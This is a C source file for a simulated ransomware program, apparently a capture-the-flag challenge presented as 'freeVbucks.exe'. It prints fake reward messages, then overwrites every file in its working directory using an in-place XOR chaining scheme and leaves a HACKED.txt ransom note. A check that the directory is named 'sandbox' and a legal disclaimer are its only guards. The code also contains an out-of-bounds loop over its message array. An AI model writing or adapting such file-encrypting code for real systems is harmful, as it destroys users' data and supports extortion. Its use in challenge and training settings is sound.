#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <windows.h>
#include <direct.h>
#include <limits.h>

/*
 * DISCLAIMER:
 * This program is intended for educational purposes and legal activities only.
 * It has been designed to simulate ransomware behavior for learning, testing, 
 * and cybersecurity research (e.g., in a CTF challenge or a controlled environment).
 * 
 * IMPORTANT: 
 * DO NOT USE THIS PROGRAM TO HARM OR COMPROMISE ANY SYSTEM WITHOUT 
 * EXPLICIT PERMISSION FROM THE SYSTEM OWNER.
 * 
 * Misuse of this software to intentionally cause harm, encrypt files without 
 * consent, or for any illegal activity is strictly prohibited and punishable 
 * under applicable laws. The author assumes no responsibility for any 
 * damage or misuse caused by this software outside of legitimate and 
 * authorized scenarios.
 * 
 * Always ensure you're working in a controlled and authorized environment.
 */


void xor_encrypt(const char* filename) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        perror("Failed to open file for encryption");
        return;
    }

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    if (filesize < 2) {
        fclose(file);
        return;
    }

    unsigned char* buffer = (unsigned char*)malloc(filesize);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return;
    }

    fread(buffer, 1, filesize, file);

    for (long i = 0; i < filesize - 1; i++) {
        buffer[i] ^= buffer[i + 1];
    }

    rewind(file);
    fwrite(buffer, 1, filesize, file);
    fclose(file);
    free(buffer);
}

void fake_activity() {
    const char* fake_messages[] = {
        "Sending money to your bank account...",
        "+10000 credit points",
        "+99999$, Enjoy your Fortnite battle pass."
    };

    for (int i = 0; i < 4; i++) {
        printf("%s\n", fake_messages[i]);
        Sleep(2000);
    }
}

int verify_directory() {
    char cwd[PATH_MAX];
    if (_getcwd(cwd, sizeof(cwd)) != NULL) {
        char* dirname = strrchr(cwd, '\\');
        if (dirname != NULL) {
            dirname++;
            if (strcmp(dirname, "sandbox") == 0) {
                return 1;
            }
        }
    } else {
        perror("Failed to get current working directory");
    }
    return 0;
}

int main() {
    // Note form author:
    // If you're wondering, this code is protecting your pc by preventing the ransomware to run anywhere except
    // the sandbox directory.
    if (!verify_directory()) {
        printf("AYO? Want to ruin your files???\n");
        return 1;
    }

    DIR *d;
    struct dirent *dir;

    fake_activity();

    d = opendir(".");
    if (!d) {
        perror("Could not open current directory");
        return 1;
    }

    while ((dir = readdir(d)) != NULL) {
        if (dir->d_name[0] == '.') {
            continue;
        }

        if (strcmp(dir->d_name, "HACKED.txt") != 0 && strcmp(dir->d_name, "freeVbucks.exe") != 0) {
            printf("Encrypting: %s\n", dir->d_name);
            xor_encrypt(dir->d_name);
        }
    }

    closedir(d);

    FILE *hack_file = fopen("HACKED.txt", "w");
    if (hack_file) {
        fprintf(hack_file, "You're hacked! Send money to securinets Insat or forget about your silly cat files.\n");
        fclose(hack_file);
    } else {
        perror("Failed to create HACKED.txt");
    }

    printf("Encryption complete.\n");
    return 0;
}
